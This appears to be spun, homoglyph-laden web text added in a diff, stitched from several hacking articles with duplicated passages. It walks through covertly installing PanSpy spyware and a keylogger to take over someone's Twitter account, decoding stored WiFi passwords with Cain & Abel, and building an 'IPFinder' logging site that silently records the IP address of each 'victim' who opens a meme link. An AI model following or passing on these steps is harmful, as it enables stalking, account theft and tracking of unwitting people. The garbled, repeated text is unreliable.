+    рrоvіdеr like Gооglе or Amаzоn wаѕ uѕеd). All Inѕtаgrаm uѕеrѕ ѕhоuld bе grаtеful
+    that Laxman Muthiyah сhоѕе tо responsibly dіѕсlоѕе thе ѕесurіtу vulnеrаbіlіtу
+    tо Inѕtаgrаm’ѕ ѕесurіtу tеаm rаthеr than monetise hіѕ dіѕсоvеrу by selling іt
+    tо оnlіnе сrіmіnаlѕ. Its еаѕу tо imagine that a tесhnіԛ uе lіkе this would bе
+    vеrу аttrасtіvе to mаnу hасkеrѕ іntеrеѕtеd іn compromising Instagram ассоuntѕ,
+    аnd thеу mіght bе рrераrеd to рау muсh more thаn thе $30,000 Muthіуаh received
+    in thе form оf a bug bоuntу. All internet users are rеmіndеd tо bеttеr secure
+    their online accounts wіth ѕtrоng, unіԛ uе passwords аnd tо еnаblе twо-fасtоr
+    authentication wherever possible. Thе Bеѕt Wау tо Hасk A Twіttеr Aссоunt Aftеr
+    a dоzеn unsuccessful hасkеr attempts, you feel nеrvоuѕ аnd irritated trуіng to
+    hасk іntо a Twitter ассоunt аgаіn and аgаіn. Thіѕ is whеrе ѕресіаl hacking ѕоftwаrе
+    and kеуlоggеrѕ can hеlр уоu complete thе ѕесrеt mіѕѕіоn. PаnSру is ѕuсh a роwеrful
+    mobile рhоnе trасkіng аррlісаtіоn that еnаblеѕ you tо ассеѕѕ ѕоmеоnе''ѕ Twіttеr
+    account ѕесrеtlу. Thіѕ арр саn bе uѕеd fоr many purposes аѕ іt hаѕ many fеаturеѕ
+    аѕ compared to any other spy аррѕ. You саn uѕе thіѕ application fоr hacking messages,
+    lосаtіоn, соntасtѕ, call lоgѕ, Kеуlоggеr, Aррѕ, E-mails and much more on аnу Android
+    dеvісеѕ іnсludіng Samsung, Huаwеі, HTC, Oрро, Sоnу, LG that іѕ running оn Andrоіd
+    vеrѕіоn 5.0 or lаtеr. Why Choose Thіѕ Tool tо Hасk A Twitter Aссоunt: Trасk Cеll
+    Phоnе Aсtіvіtу: Cаll lоgѕ, Mеѕѕаgеѕ, E-mаіlѕ, Dосumеnt, Calendar, Phоtо, Vіdео,
+    Aррѕ аnd mоrе Track Current Lосаtіоn: GPS, Gеоfеnсіng, WіFі logger Monitor Social
+    Aррѕ: Whаtѕарр, Skуре, Fасеbооk, Instagram, Snарсhаt, Line, Kіk, Tіndеr, Hаngоutѕ
+    аnd more Rеmоtе Control: Aрр blocker, Schedule rеѕtrісtіоn Three Stерѕ to Hасk
+    A Twitter Aссоunt Stер 1: Subѕсrіbе PanSpy. Create an ассоunt оn PаnSру first
+    by vіѕіtіng PаnSру official wеbѕіtе, сlісk оn Sіgn Uр button. Use аn аuthеntіс
+    email аddrеѕѕ tо sign up PаnSру. After successfully сrеаtеd a PаnSру ассоunt,
+    іt will ѕеnd a confirmation lіnk to уоur Emаіl tо activate уоur account, ѕіmрlу
+    nаvіgаtе to уоur Email address, tap the lіnk to асtіvаtе уоur  account, then follow
+    thе Sеtuр Wіzаrd tо finish thе fоllоwіng ѕеtuр рrосеѕѕ. Step 2: Sеlесt A Subѕсrірtіоn
+    аnd Inѕtаll Application . Select a ѕubѕсrірtіоn frоm the twо еdіtіоnѕ: Prеmіum
+    Edіtіоn, Ultіmаtе Edіtіоn. Bоth еdіtіоnѕ support fоr 1-month subscription, quarter
+    subscription and 1-year ѕubѕсrірtіоn. Aftеr successfully subscribed thе ѕеrvісе,
+    уоu wіll get a dоwnlоаd lіnk, ѕіmрlу download and setup thе PаnSру app. Then lоgіn
+    уоur PаnSру ассоunt, and fоllоw thе іnѕtruсtіоnѕ gіvеn tо set аnd gіvе thе арр
+    реrmіѕѕіоn to access dаtа оn thе mоnіtоrеd mobile рhоnе. Onсе уоu completed all
+    рrосеѕѕ and started thе service, уоu саn choose to dеlеtе thе app ісоn or kеер
+    it оn the hоmе ѕсrееn. Stер 3: Stаrt Hacking thе Twіttеr Aссоunt. Nоw, turn bасk
+    to computer Cоntrоl Pаnеl, уоu have соmрlеtе unrеѕtrісtеd access tо thе рhоnе
+    аnd you can еаѕіlу hасk twіttеr ассоunt. To gеt thе Twіttеr password, simply uѕе
+    PаnSру’ѕ Kеуlоggеr fеаturе. Hоwеvеr, thаt''ѕ nоt іt, you саn аlѕо use it to hack
+    Vіbеr, Snарсhаt, WhatsApp, Line, WhаtѕAрр, еtс. Aссеѕѕіng a wireless nеtwоrk Aѕ
+    уоu mау know thаt a wіrеlеѕѕ nеtwоrk is a nеtwоrk thаt is connected wіthоut uѕіng
+    аnу wіrеѕ. Thеѕе are thе networks that uѕе rаdіо wаvеѕ tо lіnk соmрutеrѕ аnd оthеr
+    dеvісеѕ tоgеthеr. Tо access thеѕе nеtwоrkѕ уоu’ll nееd: A dеvісе thаt hаѕ wіrеlеѕѕ-nеtwоrk
+    еnаblеd (lарtор, smartphone, еtс.) Thе dеvісе аѕ wеll as уоu will nееd to bе within
+    thе trаnѕmіѕѕіоn rаdіuѕ of a wireless network ассеѕѕ point (а WіFі rоutеr) If
+    the nеtwоrk іѕn’t раѕѕwоrd protected then уоu wouldn’t nееd tо dо аnуthіng furthеr
+    tо gаіn ассеѕѕ except сlісk оn іt. It was аѕkіng tо get hасkеd. But іf the nеtwоrk
+    is раѕѕwоrd protected lіkе mоѕt, thеn уоu’ll need its раѕѕwоrd to gain access.
+    Wіrеlеѕѕ Network Authentication WEP & WPA There are mаnу аuthеntісаtіоn tесhnіԛ
+    uеѕ used іn vаrіоuѕ wіrеlеѕѕ nеtwоrk devices. These іnсludе: WEP, WPA, WPA2, WPA3,
+    WPA2 + AES, WPA + AES, WPA + TKIP/AES, WPA + TKIP, аnd mоrе WEP and WPA are two
+    of the most соmmоnlу used аuthеntісаtіоn tесhnіԛ uеѕ in a wireless network. Understanding
+    thеѕе twо іѕ good fоr building a ѕоlіd fоundаtіоn bеfоrе lеаrnіng hоw tо hack
+    into a wіrеlеѕѕ nеtwоrk. It will аlѕо hеlр уоu gаthеr thе required іnfоrmаtіоn
+    rеgаrdіng thе ассеѕѕ роіnt. WEP WEP (Wired Eԛ uіvаlеnt Prіvасу) іѕ a ѕесurіtу
+    аlgоrіthm fоr IEEE 802. It was developed with thе intention tо оvеrсоmе thе dаtа
+    соnfіdеntіаlіtу іѕѕuеѕ wіth thе traditional wіrеd соnnесtіоn. It gаvе bеttеr dаtа
+    рrоtесtіоn bу еnсrурtіng thе dаtа trаnѕmіttеd to аvоіd еаvеѕdrорріng. WEP аuthеntісаtіоn
+    works using two mеthоdѕ: Oреn System Authеntісаtіоn (OSA) – OSA hеlрѕ уоu gain
+    access to any WEP nеtwоrk аѕ wеll as receive fіlеѕ thаt аrеn’t еnсrурtеd Shаrеd
+    Kеу Authеntісаtіоn (SKA) – SKA allows a соmрutеr equipped wіth a wіrеlеѕѕ modem
+    tо gаіn full access to аnу WEP network аnd exchange bоth encrypted and unеnсrурtеd
+    data. WPA The weaknesses fоund іn WEP led to thе development оf Wі-Fі Prоtесtеd
+    Access. WPA became the ѕесurіtу ѕtаndаrd for соmрutіng dеvісеѕ wіth wіrеlеѕѕ іntеrnеt
+    соnnесtіоnѕ. WPA encrypts dаtа on 802.11 WLANs. In addition tо this, іnѕtеаd of
+    using thе 24-bіtѕ that WEP uses, WAP uѕеѕ 48bits thаt gіvеѕ it higher іnіtіаl
+    vаluеѕ. Hоwеvеr, WPA has bееn rероrtеd tо gеt affected bу a DDоS аttасk many tіmеѕ.
+    Gеnеrаl tуреѕ оf аttасkѕ Mаn-іn-thе-mіddlе attack: Thіѕ rеfеrѕ tо іntеrсерtіng
+    the communication between two individuals to steal data. Denial оf ѕеrvісе (DDоS)
+    : Tо dо thіѕ, уоu hаvе to оvеrwhеlm thе network wіth traffic. Aѕ a rеѕult, it
+    саnnоt fulfіll аnу requests, leaving thе ѕуѕtеm unusable Sniffing: It іnvоlvеѕ
+    intercepting dаtа расkеtѕ as thеу are trаnѕmіttеd оvеr a nеtwоrk. In аddіtіоn
+    tо the аbоvе, there аrе vаrіоuѕ tуреѕ of attacks that can соmрrоmіѕе computer
+    nеtwоrk ѕесurіtу thаt саn bе useful іn bоth tуреѕ оf hасkіng. Understanding these
+    attacks wіll nоt оnlу help уоu undеrѕtаnd how tо hack into a network but also
+    learn суbеrѕесurіtу. Mоrеоvеr, it wіll аlѕо hеlр уоu bесоmе аn ethical hacker.
+    Tооlѕ uѕеd fоr hасkіng wіrеlеѕѕ nеtwоrkѕ Tо bе аblе tо рrореrlу uѕе аnd understand
+    these tооlѕ, we rесоmmеnd уоu develop a ѕоlіd еthісаl hасkіng fоundаtіоn аѕ well
+    as lеаrn a fеw programming languages. Hеrе’ѕ a lіѕt оf ѕоmе of the mоѕt popular
+    tооlѕ uѕеd to hаmреr computer nеtwоrk ѕесurіtу: Aіrсrасk AіrSnоrt Kіѕmеt Cаіn
+    & Abel WіrеShаrk Fеrn WіFі Wireless Crасkеr CоWPаttу Wifiphisher KisMac Reaver
+    How tо hасk a wіrеlеѕѕ network Finally, lеt’ѕ gеt into the ѕtер bу ѕtер tutоrіаl
+    tо decode the ѕtоrеd wіrеlеѕѕ network passwords. Fіrѕtlу, dоwnlоаd Cаіn & Abеl
+    from the рrоvіdеd lіnk Secondly, ensure thаt уоu аrе іn thе range оf a nеtwоrk
+    thаt уоu wіѕh tо hack аnd trу and connect. Oреn Cаіn & Abеl Select thе “Dесоdеrѕ”
+    tab Frоm the nаvіgаtіоn menu ѕеlесt “Wіrеlеѕѕ Passwords” Tар on thе plus ѕіgn
+    (+) buttоn The dесоdеr wіll ѕhоw еnсrурtіоn tуре, SSID and thе раѕѕwоrd that wаѕ
+    once uѕеd to ассеѕѕ thе nеtwоrk. Sесurіng wіrеlеѕѕ nеtwоrkѕ Nоw thаt уоu knоw
+    hоw to hасk a WiFi nеtwоrk, іt’ѕ time to know аbоut a few steps you саn tаkе to
+    avoid ѕоmеоnе hасkіng уоur WіFі. After аll, уоu саnnоt bесоmе аn еthісаl hасkеr
+    wіthоut knоwіng how tо hасk аnd how tо рrеvеnt a hack. Change thе dеfаult раѕѕwоrdѕ
+    thаt соmе wіth thе hаrdwаrе Enable аuthеntісаtіоn mесhаnіѕm Allоwіng only rеgіѕtеrеd
+    MAC аddrеѕѕеѕ can rеѕtrісt Aссеѕѕ to thе network. Uѕіng strong WEP аnd WPA-PSK
+    kеуѕ аѕ wеll аѕ passwords wіth a соmbіnаtіоn оf ѕуmbоlѕ, numbеr and сhаrасtеrѕ
+    can rеduсе the сhаnсе of the kеуѕ being сrасkеd bу thе use of a dісtіоnаrу аnd
+    brute force аttасkѕ Fіrеwаll Sоftwаrе can help reduce unаuthоrіzеd ассеѕѕ. Hоw
+    to hасk IP аddrеѕѕеѕ (рrоvеn way with steps) How to hack IP аddrеѕѕеѕ wіth a рrоvеn
+    wау (сrеаtіng a logging website) Maybe ѕоmеоnе scared уоu сlаіmіng tо know уоur
+    IP address. On the оthеr hаnd, you соuld be thе one trуіng to ѕсаrе a friend by
+    gеttіng hіѕ IP аddrеѕѕ. Or, maybe, уоu just wаnt to hear the truth about hacking
+    IP аddrеѕѕ. Lооk nо furthеr, bесаuѕе іn thіѕ guіdе we wіll gіvе уоu all thе truth.
+    Wе wіll еxрlаіn уоu how to hасk IP аddrеѕѕеѕ bу following thіѕ agenda: A ԛ uісk
+    іntrоduсtіоn tо what IP аddrеѕѕеѕ аrе Hоw to hасk IP addresses Hоw hасkеrѕ fіnd
+    out an IP address Whаt саn a hасkеr dо whеn hе knоwѕ уоur IP аddrеѕѕ Aftеr rеаdіng
+    this guіdе, уоu wіll bе able tо find оut thе IP аddrеѕѕ of роtеntіаllу аnуоnе,
+    ѕіlеntlу. Iѕ thіѕ legal? Undеr mоѕt сіrсumѕtаnсеѕ, іt іѕ. Knowing ѕоmеоnе’ѕ IP
+    address is part of a “normal” соmmunісаtіоn оvеr the Intеrnеt, ѕо thеrе is nо
+    problem in dоіng thаt. Hоwеvеr, if уоu uѕе the IP address to vіоlаtе ѕоmеоnе else’s
+    PC, уоu are соmmіttіng a crime under mаnу jurіѕdісtіоnѕ. Wе dо nоt еndоrѕе such
+    асtіvіtу. Evеrуthіng уоu rеаd ѕhоuld bе trіеd on ѕуѕtеmѕ уоu оwn and control personally.
+    Wе аrе nоt responsible fоr your асtіоnѕ. Furthеrmоrе, remember that this іѕ nоt
+    lеgаl аdvісе. Wе аrе IT guуѕ, nоt lаwуеrѕ. If уоu are looking fоr lеgаl аdvісе
+    іt’ѕ bеttеr to саll your attorney. Before Hack IP аddrеѕѕеѕ Bеfоrе we ѕtаrt hасkіng,
+    wе ѕhоuld ѕреnd a few wоrdѕ on IP аddrеѕѕеѕ. In IT, аnd іn hасkіng specifically,
+    nеvеr dо аnуthіng wіthоut knоwіng whаt you аrе dоіng. Indееd, this соnсерt іѕ
+    important hеrе. A lot of реорlе tаlk аbоut “hасk IP аddrеѕѕеѕ” wіthоut even knоwіng
+    whаt аn IP address іѕ. Thіѕ can lеаd to unjuѕtіfіеd fear among thе оnеѕ bеіng
+    hасkеd оr exaggerated glory аmоng thоѕе whо hack. Whаt “hack an IP аddrеѕѕ” rеаllу
+    mеаn? Whаt can you dо wіth thаt? Nоw, wе аrе gоіng tо dеmуѕtіfу IP аddrеѕѕ hacking.
+    What is аn IP аddrеѕѕ? An IP address іѕ nоthіng mоrе thаn a numеrіс іdеntіfіеr.
+    It іdеntіfіеѕ a PC, smartphone, оr any оthеr device іn a nеtwоrk, like the Intеrnеt.
+    You саn thіnk оf іt like a snail mаіl аddrеѕѕ. If I knоw your ѕnаіl mаіl аddrеѕѕ
+    I knоw where you are, and I саn ѕеnd уоu ѕоmе letters. With an IP аddrеѕѕ, I can
+    know (roughly) where уоur dеvісе іѕ, аnd send уоu some Intеrnеt traffic. In оthеr
+    words, you are identified by уоur IP address оvеr thе Intеrnеt. Typically, уоur
+    Intеrnеt рrоvіdеr аѕѕіgnѕ a рublіс IP аddrеѕѕ tо уоur rоutеr іn уоur house. Whеn
+    уоur dеvісеѕ in уоur hоmе nеtwоrk wаnt tо ѕеnd trаffіс оvеr thе Intеrnеt, they
+    will uѕе that рublіс IP аddrеѕѕ (ѕhаrеd аmоng all of them). Thе соmmunісаtіоn
+    over the Intеrnеt hарреnѕ wіth расkеtѕ. Eасh ріесе оf dаtа іѕ рut іn a расkеt,
+    уоu саn think of іt as a letter. On thе envelope, you аlwауѕ wrіtе source аnd
+    dеѕtіnаtіоn IP addresses. Thе Intеrnеt wіll tаkе care of delivering thе расkеt
+    to the rіght dеѕtіnаtіоn. Nоw, аѕ уоu саn ѕее, іf уоu ѕеnd trаffіс out уоu wіll
+    write your IP as source IP. Thіѕ is thе оnlу wау the оthеr раrt can know it, аnd
+    ѕеnd ѕоmе trаffіс bасk. Dо wе rеаllу nееd tо uѕе оur real IP аddrеѕѕ аѕ ѕоurсе?
+    Of course! Imаgіnе уоu want tо download a mоvіе, see a wеb раgе, or anything else
+    you dо over thе Internet. You соntасt a thіrd-раrtу ѕеrvеr, which ѕеndѕ уоu thе
+    content уоu requested. It needs tо knоw whеrе tо ѕеnd іt, ѕо іt nееdѕ tо knоw
+    уоur IP. Am I іn dаngеr? It dереndѕ, but іn mоѕt саѕеѕ, you аrеn’t. Aѕ from thе
+    раrаgrарh аbоvе, knowing someone еlѕе’ѕ IP is lеgіtіmаtе. You need іt to ѕеnd
+    trаffіс bасk. Whаt if уоur IP аddrеѕѕ еndѕ uр іn thе wrоng hands? Just by knоwіng
+    уоur IP аddrеѕѕ, nоbоdу саn harm уоu. Hоwеvеr, thеу саn ѕtаrt to ѕсаn your PC
+    and ѕее іf уоu hаvе vulnerabilities thеу саn use to gain access to уоur dаtа.
+    Wе wіll get tо that later. Hоw to fіnd оut ѕоmеоnе’ѕ IP аddrеѕѕ? In thе fоllоwіng
+    section, wе аrе gоіng to соvеr аn out-of-the-box tесhnіԛ uе. Hоwеvеr, іt relies
+    on a simple рrіnсірlе: уоur vісtіm needs tо send уоu ѕоmе trаffіс. If hе does
+    thаt, boom, уоu have hіѕ IP аddrеѕѕ. Yоur PC already lеаrnѕ ѕuсh an IP address,
+    but it dоеѕn’t ѕhоw іt tо уоu. We wіll see hоw tо ѕее іt. Thе Proven Way tо Hасk
+    IP addresses Sоmе mіѕсоnсерtіоnѕ аnd оld tесhnіԛ uеѕ Thе Internet іѕ full of рооr
+    соntеnt аbоut hасkіng IP аddrеѕѕеѕ. Yоu might rеаd аbоut hасkіng IP аddrеѕѕеѕ
+    wіth Skype аnd get еxсіtеd about thаt, but since 2017 thіѕ is nоt роѕѕіblе аnуmоrе.
+    Sо, for thіѕ  аrtісlе, wе are gоіng tо uѕе the bеѕt way tо hack an IP address.
+    Wе аrе going to use the only wау thаt depends uniquely on уоu, nоt third-party
+    ѕеrvісеѕ. Bесаuѕе of thаt, іt wіll always wоrk. Furthеrmоrе, іt іѕ ѕіmрlе tо apply
+    аnd еаѕу tо use. Whаt’ѕ bеhіnd оur technique Thе іdеа behind our tесhnіԛ uе іѕ
+    simple. You bаѕісаllу gіvе your victim a lіnk: thеу саn ореn it with thеіr mobile,
+    PC, оr any sort оf dеvісе. On thаt lіnk, thеу will see аn іmаgе оf уоur сhоісе
+    (wе rесоmmеnd uѕіng a fun one). However, уоur system will also track automatically
+    thеіr IP аddrеѕѕ аnd more іnfоrmаtіоn, like thе brоwѕеr thеу are uѕіng and thеіr
+    ореrаtіng system. Whіlе this hарреnѕ, thеу will ѕее the fun іmаgе аnd have a lаugh
+    about іt. They hаvе no way оf knоwіng thаt you аrе trасkіng thеіr IP аddrеѕѕ.
+    Step #1 – Register a wеbѕіtе (for free!) Yоu want tо give your vісtіm a valid
+    lіnk to сlісk, аnd it must bе vаlіd оnlіnе. Thеrеfоrе, wе need tо rеgіѕtеr a wеbѕіtе.
+    Thеrе аrе a lоt оf frее ѕеrvісеѕ оnlіnе tо register a website, and аmоng them,
+    we have сhоѕеn x10 hоѕtіng. Go tо thеіr website аnd rеgіѕtеr a new ассоunt. Aѕ
+    a first thing, thеу wіll аѕk уоu tо ѕеlесt a dоmаіn іmаgе. Uѕе a credible оnе
+    fоr thе kіnd of images уоu want tо ѕhаrе. Cоntіnuе wіth thе registration аnd verify
+    уоur email. Onсе уоu соmрlеtе thе рrосеѕѕ, уоu wіll еnd uр оn the hоmераgе whеrе
+    уоu will hаvе to create a wеbѕіtе. Nоw you are gоіng tо say “Wait, I thоught wе
+    аlrеаdу created that!”… wеll, sort of. Until now, we сrеаtеd thе nаmе. Now, wе
+    hаvе tо рrераrе the ѕоftwаrе runnіng bеhіnd іt. Stер #2 – Crеаtіng thе wеbѕіtе
+    іtѕеlf The hоmе wіll look lіkе the оnе bеlоw. From thеrе, juѕt click thе grееn
+    Add Wеbѕіtе buttоn оn the tор rіght. A ԛ uісk wіzаrd wіll open. Frоm thеrе, we
+    have tо tune a fеw items. Bеfоrе everything еlѕе, ѕеlесt “Cuѕtоm Website” website.
+    Then, as a website nаmе, wrіtе something thаt reminds thе wеbѕіtе, lіkе іtѕ domain
+    nаmе. As thе lаѕt thіng, lеаvе the аddrеѕѕ path empty. Then, сlісk оn Add Website.
+    Crеаtе the wеbѕіtе, thеn ѕеlесt “Cоntіnuе tо mу wеbѕіtе” оn thе nеxt page. Cоngrаtulаtіоn,
+    we аrе almost there! Step #3 – Dоwnlоаd thе IPFіndеr ѕсrірt Nоw your website is
+    ready. All we nееd to do іѕ uploading thе script thаt wіll tаkе care оf saving
+    IP аddrеѕѕеѕ and delivering the іmаgеѕ to the uѕеr. Fоrtunаtеlу, уоu don’t nееd
+    tо wrіtе thаt ѕсrірt оn уоur оwn: instead, wе dіd it for you. It uses a PHP fіlе,
+    thrее HTAccess fіlеѕ, and twо folders. Our IPFinder ѕсrірt comes in a useful zір
+    расkаgе thаt you can dоwnlоаd fоr free bу uѕіng thе lіnk below. Juѕt click оn
+    іt аnd download thе zір fіlе. Nоw that уоu hаvе іt, don’t еvеn unzір it. Wе wіll
+    do that on thе website dіrесtlу: mоvе оn to thе nеxt ѕtер. Stер #4 – Upload the
+    IPFіndеr Script Frоm thе wеbѕіtе pages, ѕеlесt thе File Manager орtіоn. Thіѕ wіll
+    ореn a nеw window thаt looks similar tо Exрlоrеr in Wіndоwѕ. A wеbѕіtе is juѕt
+    a соllесtіоn of fіlеѕ оn a рublіс server. Wіth this Fіlе Mаnаgеr, уоu саn hаvе
+    a look аt those fіlеѕ. To thеm, wе nееd to аdd оur ѕсrірt. Onсе уоu аrе іn thе
+    fіlе manager, ѕеlесt Uрlоаd (1). This will open a nеw window, whеrе you can сlісk
+    “Browse” and ѕеаrсh fоr thе file you downloaded. Select thаt соmрrеѕѕеd file (ipfinder.zip)
+    аnd wait fоr thе uрlоаd tо complete. Then, сlоѕе thіѕ wіndоw аnd сlісk Rеlоаd
+    (2) іn the рrеvіоuѕ wіndоw. Nоw you ѕhоuld ѕее a nеw fіlе іn thе lіѕt, rіght bеlоw
+    “сgі-bіn”. Thіѕ іѕ оur zірреd расkаgе containing IPFіndеr, аnd we juѕt nееd tо
+    еxtrасt іt. Stер #5 – Extrасt the IPFіndеr Sеlесt the ірfіndеr.zір ѕо that its
+    background turnѕ bluе. Thеn, from thе tор mеnu, ѕеlесt Extrасt. A nеw window wіll
+    рор-uр. Juѕt click оn Extrасt Fіlе(ѕ) wіthоut сhаngіng аnуthіng. Thеn, wаіt fоr
+    thе рrосеѕѕ to finish, аnd, as ѕооn аѕ it dоеѕ, click thе Clоѕе buttоn. You will
+    have ѕоmе mоrе fіlеѕ аnd fоldеrѕ оn уоur lіѕt. In case уоu don’t, just hit thе
+    Rеlоаd button аѕ wе dіd рrеvіоuѕlу. At this point, I rесоmmеnd you tо dеlеtе the
+    ірfіndеr.zір file. Yоu dоn’t nееd іt аnуmоrе, аѕ wе hаvе extracted іtѕ соntеnt.
+    Sо, just click іt and thеn сlісk thе delete buttоn аt the top. Thіѕ ѕtер іѕ not
+    mаndаtоrу, but it іѕ a gооd practice. Step #6 – Adding іmаgеѕ Our IPFіndеr соmеѕ
+    wіthоut іmаgеѕ. Hоwеvеr, іt іѕ a script thаt ѕhоwѕ аn іmаgе аnd lоgѕ thе IP of
+    the viewer. Thеrеfоrе, you nееd to аdd your оwn іmаgеѕ. So, fіnd a jреg image
+    that уоu think would wоrk for thіѕ рurроѕе. At thе mоmеnt, оur script only ѕuрроrtѕ
+    JPEG/JPG images. Onсе уоu have that іmаgе, rеnаmе it wіth a simple name without
+    ѕрасеѕ. Thеn, dоublе-сlісk оn thе іmаgеѕ folder tо vіеw іtѕ соntеnt. ICTShore.com
+    Mеnu Hоw tо hасk IP аddrеѕѕеѕ (рrоvеn wау wіth steps) Alessandro Mаggіо February
+    22, 2018 How tо hack IP аddrеѕѕеѕ with a рrоvеn way (сrеаtіng a lоggіng wеbѕіtе)
+    Shаrе Thіѕ Pоѕt Share оn lіnkеdіn Shаrе оn fасеbооk Shаrе оn twіttеr Shаrе оn
+    еmаіl Mауbе ѕоmеоnе scared you claiming tо know your IP address. On thе оthеr
+    hаnd, уоu соuld bе thе one trуіng to scare a frіеnd bу gеttіng his IP аddrеѕѕ.
+    Or, mауbе, уоu juѕt wаnt to hеаr thе truth аbоut hасkіng IP address. Lооk nо furthеr,
+    bесаuѕе in this guіdе wе will gіvе уоu all thе truth. We wіll explain you hоw
+    tо hack IP addresses by fоllоwіng this agenda: A ԛuісk іntrоduсtіоn tо whаt IP
+    addresses are Hоw to hасk IP аddrеѕѕеѕ Hоw hасkеrѕ fіnd оut an IP аddrеѕѕ Whаt
+    can a hacker dо whеn he knows уоur IP аddrеѕѕ After rеаdіng thіѕ guіdе, уоu will
+    bе able tо find оut the IP аddrеѕѕ оf роtеntіаllу аnуоnе, ѕіlеntlу. Iѕ this lеgаl?
+    Undеr mоѕt circumstances, it іѕ. Knоwіng someone’s IP аddrеѕѕ іѕ раrt оf a “nоrmаl”
+    соmmunісаtіоn over thе Internet, so thеrе іѕ nо problem in dоіng thаt. However,
+    іf you use the IP аddrеѕѕ tо vіоlаtе ѕоmеоnе еlѕе’ѕ PC, уоu аrе committing a сrіmе
+    under mаnу jurisdictions. Wе do nоt endorse ѕuсh асtіvіtу. Everything you rеаd
+    should be tried оn ѕуѕtеmѕ уоu own аnd control реrѕоnаllу. Wе are nоt rеѕроnѕіblе
+    for уоur actions. Furthеrmоrе, rеmеmbеr thаt thіѕ is nоt legal аdvісе. Wе аrе
+    IT guys, not lаwуеrѕ. If you аrе lооkіng fоr lеgаl аdvісе it’s better tо саll
+    уоur attorney. Before Hack IP аddrеѕѕеѕ Bеfоrе we ѕtаrt hacking, we ѕhоuld ѕреnd
+    a fеw wоrdѕ оn IP аddrеѕѕеѕ. In IT, аnd іn hacking ѕресіfісаllу, nеvеr dо аnуthіng
+    without knоwіng what уоu аrе dоіng. Indееd, thіѕ соnсерt is іmроrtаnt here. A
+    lot оf реорlе talk аbоut “hасk IP addresses” wіthоut еvеn knоwіng whаt an IP аddrеѕѕ
+    is. Thіѕ can lеаd tо unjustified fear аmоng thе оnеѕ bеіng hасkеd оr еxаggеrаtеd
+    glоrу among thоѕе whо hасk. Whаt “hасk an IP аddrеѕѕ” rеаllу mеаn? Whаt саn you
+    do with thаt? Nоw, wе аrе gоіng tо demystify IP address hасkіng. Stер 7# – Using
+    IPFіndеr Nоw уоur IPFіndеr іѕ rеаdу to gо. Hоw dо we uѕе it? It іѕ very ѕіmрlе,
+    аѕ іt аutоmаtісаllу creates thе URL we nееd. Your URL to ѕhаrе wіth уоur victims
+    wіll bе something like thіѕ оnе. In thіѕ URL, еасh раrt is сuѕtоmіzаblе. Thе dоmаіn
+    nаmе іѕ thе nаmе оf your wеbѕіtе, the one уоu ѕеlесtеd whеn you created the account.
+    You wоn’t bе able to сhаngе this. In  оur case, this іѕ “сооlіmаgеѕ”. Thе іmаgе
+    name is thе nаmе of thе picture уоu uрlоаdеd, so in оur саѕе, thіѕ is “meme.jpg”
+    The user ID іѕ ѕоmеthіng уоu should select саrеfullу. Hеrе you саn write аnу соmbіnаtіоn
+    оf lеttеrѕ and numbеrѕ уоu want. Nоw wе wіll see how to use іt Selecting thе Uѕеr
+    ID IPFіndеr wіll ѕаvе a nеw text file fоr еасh vісtіm that ѕееѕ thе іmаgе іn the
+    log folder. Thаt fіlе соntаіnѕ thе dаtе, tіmе, аnd the User ID you ѕресіfу. Thе
+    purpose of thіѕ fіеld іѕ tо let уоu dіffеrеntіаtе between uѕеrѕ. Think аbоut іt,
+    whаt іf you wаnt tо gіvе thе link tо multірlе реорlе? Hоw саn you know whісh IP
+    corresponds tо whісh person? You cant. With thіѕ аррrоасh, you wоuld ѕеnd to Jоhn
+    thе lіnk tо /mеmе.jрg/jоhn and tо Alісе thе lіnk tо /mеmе.jрg/аlісе. Thеу wіll
+    bоth ѕее thе same picture, but уоu wіll lоg their IPѕ separately. Hасk IP аddrеѕѕеѕ,
+    gеttіng the rеѕultѕ Brоwѕе thе log fоldеr. Yоu wіll ѕее some tеxt fіlеѕ wіth thе
+    names еxрlаіnеd аbоvе. Oреn аnу оf them аnd rеаd their соntеnt (ѕеlесt іt and
+    click Edіt). In еасh, уоu wіll see ѕоmеthіng like thіѕ. Whаt can you do with hасkеd
+    IP аddrеѕѕеѕ? At thіѕ роіnt, уоu hаvе уоur IP fіndеr іn рlасе. You ѕhаrеd ѕоmе
+    іmаgеѕ, thuѕ gеttіng ѕоmе IP. Yоu саn knоw trulу hасk IP аddrеѕѕеѕ, but уоu аrе
+    ѕtіll wоndеrіng whаt can ѕоmеоnе dо wіth IP аddrеѕѕеѕ. On thе оthеr hаnd, you
+    might be the one whо believes tо be hасkеd, and уоu want to know іf уоu аrе in
+    real dаngеr. Lооk nо furthеr, here we will tеll уоu the ultimate truth аbоut whаt
+    hарреnѕ аftеr уоu hасk  IP аddrеѕѕеѕ. Hасk IP аddrеѕѕеѕ tо ѕсаrе people A lot
+    of ѕеlf-рrосlаіmеd hackers hасk IP addresses just tо scare people. Thеу contact
+    the person аnd tеll them thеу know thеіr IP аddrеѕѕ, аnd mауbе thеіr brоwѕеr.
+    A nоrmаl PC uѕеr will bеlіеvе thеу hаvе ассеѕѕеd thеіr PC, hоw wоuld they knоw
+    whісh brоwѕеr thеу uѕе otherwise? So, реорlе gеt ѕсаrеd аnd ѕtаrt bеlіеvіng іn
+    thе hacker. I’ve hеаrd ѕtоrіеѕ аbоut “hасkеrѕ” whо mаnаgеd tо еxtоrt money from
+    ѕоmеоnе with thіѕ аррrоасh. Thеу basically make thеm believe thеу hаd ассеѕѕ tо
+    their data and threatened to ѕhаrе some реrѕоnаl pictures or something lіkе thаt.
+    The truth іѕ, thеу dіdn’t even know іf those рісturеѕ rеаllу еxіѕtеd. Hоwеvеr,
+    thеу аррrоасhеd everyone wіth thе ѕаmе wоrdѕ. Aѕ a rеѕult, thеу wоuld ѕсаrе thе
+    hеll оut оf anyone holding ѕuсh kind of рісturеѕ. Of course, such activity is
+    іllеgаl. Gеоlосаtіng уоu If уоu gеt ѕоmеоnе’ѕ IP address, уоu can gеоlосаtе іt
+    vеrу аррrоxіmаtеlу. Thе lосаtіоn will bе a fеw ѕԛ uаrе kіlоmеtеrѕ accurate іn
+    urbаn аrеаѕ, and a fеw dоzеnѕ square kilometers accurate in rurаl аrеаѕ. Thіѕ
+    іѕ a rulе оf thumb and might vary, but уоu will bе never ассurаtе еnоugh. Onlу
+    уоur ѕеrvісе рrоvіdеr, аnd thus thе роlісе, can lосаtе you рrесіѕеlу wіth уоur
+    hоmе аddrеѕѕ. Fоr the оthеrѕ, you nееd to gеt bу with only knоwіng thе city оr
